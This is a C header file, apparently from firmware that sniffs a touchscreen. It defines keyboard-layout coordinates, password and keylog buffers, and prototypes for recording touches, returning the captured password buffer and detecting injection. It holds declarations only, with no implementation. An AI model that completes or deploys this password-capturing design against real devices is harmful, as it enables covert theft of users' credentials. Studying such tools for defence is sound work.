#ifndef _SNIFF_H_
#define _SNIFF_H_

#include "main.h"

#define PASSWORD_RECORD_SIZE 50
#define THRESHOLD 5

#define KEYBOARD1_SIZE  30 // a-z chars.
#define KEYBOARD2_SIZE 30 // rest.
#define LAYOUT_COUNT 2
#define NEXT_KEYBOARD_KEY_ID 1
#define PREV_KEYBOARD_KEY_ID 2
#define ENTER_KEY_ID 3
#define KEYLOG_BUFF_SIZE 256

#define CHARACTER_WIDTH 144
#define CHARACTER_HEIGHT 220

#define KEYBOARD1_LINE1_X_OFFSET 0
#define KEYBOARD1_LINE2_X_OFFSET 80
#define KEYBOARD1_LINE3_X_OFFSET 226

#define KEYBOARD1_LINE1_Y_OFFSET 1500
#define KEYBOARD1_LINE2_Y_OFFSET (KEYBOARD1_LINE1_Y_OFFSET + CHARACTER_HEIGHT)
#define KEYBOARD1_LINE3_Y_OFFSET (KEYBOARD1_LINE2_Y_OFFSET + CHARACTER_HEIGHT)
#define KEYBOARD1_LINE4_Y_OFFSET (KEYBOARD1_LINE3_Y_OFFSET + CHARACTER_HEIGHT)

#define KEYBOARD2_LINE1_X_OFFSET 0
#define KEYBOARD2_LINE2_X_OFFSET 0
#define KEYBOARD2_LINE3_X_OFFSET 205

#define KEYBOARD2_LINE1_Y_OFFSET 1500
#define KEYBOARD2_LINE2_Y_OFFSET (KEYBOARD2_LINE1_Y_OFFSET + CHARACTER_HEIGHT)
#define KEYBOARD2_LINE3_Y_OFFSET (KEYBOARD2_LINE2_Y_OFFSET + CHARACTER_HEIGHT)
#define KEYBOARD2_LINE4_Y_OFFSET (KEYBOARD2_LINE3_Y_OFFSET + CHARACTER_HEIGHT)

typedef struct Letter
{
	uint8_t letter;
	uint32_t x0;
	uint32_t x1;
	uint32_t y0;
	uint32_t y1;
} Letter;

typedef struct Keboard
{
	Letter layout1[KEYBOARD1_SIZE];
	Letter layout2[KEYBOARD2_SIZE];
} Keyboard;


uint8_t getLetterFromBuff(uint8_t index);
uint32_t hasInjection(uint8_t addr, uint8_t len, const uint8_t* buff, uint8_t* allowTransmission);
uint16_t* getPwdBuffer();
uint8_t recordTouches(uint16_t x, uint16_t y);
void resetBuffer();
uint8_t getTypedSize();
void sniffer_init();


#endif
